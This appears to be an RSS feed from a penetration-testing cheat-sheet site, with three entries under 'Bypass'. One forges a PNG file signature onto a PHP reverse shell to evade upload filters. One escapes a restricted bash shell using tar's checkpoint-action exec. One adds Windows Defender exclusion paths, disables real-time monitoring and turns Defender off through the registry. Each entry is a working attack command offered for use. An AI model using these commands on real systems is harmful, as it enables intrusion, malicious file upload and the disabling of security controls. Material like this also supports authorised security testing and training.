channel.title: Bypass on TLDRBins
channel.description: Recent content in Bypass on TLDRBins

item.title: Magic Bytes
item.description: Forge File Signature png echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> php-reverse-shell.php.png cat php-reverse-shell.php >> php-reverse-shell.php.png

item.title: rbash
item.description: Abuse #1: tar to rbash Escape # Before enter rbash echo $PATH # Enter rbash su <USER> - # rbash escape using tar tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash # Paste the above $PATH (e.g.) export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

item.title: Windows Defender
item.description: Check Exclusion Path .\SharpExclusionFinder.exe '<PATH>' Ref: SharpExclusionFinder Add Exclusion Path Add-MpPreference -ExclusionPath '<PATH>' Disable Defender powershell # Disable realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Completely disable defender New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
